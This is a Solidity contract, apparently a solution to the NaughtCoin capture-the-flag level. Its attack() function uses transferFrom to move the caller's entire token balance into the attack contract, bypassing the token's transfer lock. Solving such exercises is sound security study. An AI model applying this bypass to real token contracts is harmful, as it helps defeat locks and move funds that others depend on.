// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;
import {NaughtCoin} from "./NaughtCoin.sol";

contract NaughtCoinAttack {

    NaughtCoin victim;

    constructor(address _v) {
        victim = NaughtCoin(_v);

            
        
    }

    function attack() public {
        victim.transferFrom(msg.sender, address(this), victim.balanceOf(msg.sender));
    }
    
}
